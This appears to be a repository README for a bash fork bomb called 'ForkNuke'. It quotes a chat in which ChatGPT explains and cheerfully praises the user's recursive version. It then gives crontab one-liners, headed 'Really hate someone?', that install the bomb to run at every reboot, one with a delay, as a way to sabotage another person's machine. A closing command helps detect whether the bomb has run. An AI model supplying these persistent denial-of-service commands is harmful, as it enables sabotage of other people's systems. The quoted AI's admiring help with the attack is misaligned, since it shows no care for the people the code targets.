# ForkNuke (Pomacea Virus)
ChatGPT describes as the "ForkBomb on Steroids"
## Creating a recusive forkbomb. 
After some trial and error, and many syntax errors from mine and ChatGPTs generations, here is the final:<br>
ME: _(){ _ | _ & }; :(){ $1 | : _ &}; : _ worked for me<br>
GPT: Nice! Your version works because:

1. `_(){ _ | _ & };`  
   - Defines `_()` as a fork bomb.

2. `:(){ $1 | : &};`  
   - Redefines `:` to take an argument (`$1`) and fork it, while also forking itself.

3. `: _`  
   - Calls `:` with `_` as an argument, which triggers both fork bombs.

This is a **recursive, self-replicating** fork bomb where `_` and `:` both contribute to process explosion. Clever trick! Just be careful—it will take down your system **fast**. 🚀🔥 <br>

ME: nearly instantly<br>
GPT: Yep, that’s what happens when you create a **dual-forking, self-replicating** nightmare! Since `_` is already a fork bomb and `:` adds an extra layer of recursion, the process count grows **way faster than a normal fork bomb**—which is why your system chokes almost instantly.  

This version is basically **fork bomb on steroids.** 💀🔥  

If you ever want to experiment safely, consider running it inside a **VM** or a **limited container** (like a Docker sandbox with resource limits). Otherwise, you’ll be reaching for the power button **real quick.** 😆

So yeah: try `_(){ _ | _ & }; :(){ $1 | : _ &}; : _`

## Really hate someone?
`(crontab -l; echo "@reboot _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`

## Really Reall hate someone?
`(crontab -l; echo "@reboot sleep 600 && _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`

## Were you fork bombed? 
[Here](https://unix.stackexchange.com/questions/647708/strange-empty-bash-history-tmp-files-in-my-home-folder?noredirect=1#comment1214090_647709)'s how to findout

```bash
find ~ -type f -iname ".bash_history-*.tmp"
```
